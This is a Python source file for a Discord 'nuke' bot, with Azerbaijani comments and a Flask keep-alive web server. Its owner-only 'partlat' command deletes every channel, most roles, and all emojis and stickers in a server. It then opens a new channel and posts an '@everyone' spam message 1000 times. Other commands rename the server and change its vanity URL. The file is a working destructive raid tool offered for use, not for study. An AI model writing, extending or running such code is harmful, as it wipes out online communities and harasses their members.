import discord
from discord.ext import commands, tasks
import asyncio
import os
import random
import time
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot online!"

def run():
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.voice_states = True
intents.reactions = True

bot = commands.Bot(command_prefix='r?', intents=intents)

SAHIB_ID = 64101496631250258

@bot.event
async def on_ready():
    print(f"Bot Ise dusdu: {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name="r?bot | Aktifdir 👑"))

# ---- ƏSAS PARTLATMA VƏ TƏMİZLƏMƏ KOMANDASI ----

@bot.command(name="partlat")
async def partlat(ctx):
    if ctx.author.id != SAHIB_ID:
        return
    
    guild = ctx.guild

    # 1. Bütün kanalları sil
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # 2. Bütün rolları sil
    for role in guild.roles:
        if role != guild.default_role and role < guild.me.top_role:
            try:
                await role.delete()
            except:
                pass

    # 3. Emojiləri və stikerləri sil
    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except:
            pass
    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

    # 4. Təzə kanal aç və orada 1000 dəfə spamla
    try:
        yeni_kanal = await guild.create_text_channel("yenilmez-chat")
        for i in range(1000):
            await yeni_kanal.send("@everyone /yenilmezyaz gir")
            await asyncio.sleep(0.4)
    except:
        pass

# ---- DİGƏR İDARƏETMƏ KOMANDALARI ----

@bot.command(name="urldəyiş")
async def urldəyiş(ctx, yeni_url: str):
    if ctx.author.id != SAHIB_ID:
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Server URL-si dəyişdirildi: discord.gg/{yeni_url}")
    except Exception as e:
        await ctx.send(f"❌ Xəta: {e}")

@bot.command(name="adakart")
async def adakart(ctx, *, yeni_ad: str):
    if ctx.author.id != SAHIB_ID:
        return
    try:
        await ctx.guild.edit(name=yeni_ad)
        await ctx.send(f"✅ Serverin adı dəyişdirildi: **{yeni_ad}**")
    except Exception as e:
        await ctx.send(f"❌ Xəta: {e}")

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"🏓 Gecikme: {round(bot.latency * 1000)}ms")

if __name__ == "__main__":
    keep_alive()
    token = os.environ.get("TOKEN")
    if token:
        bot.run(token)
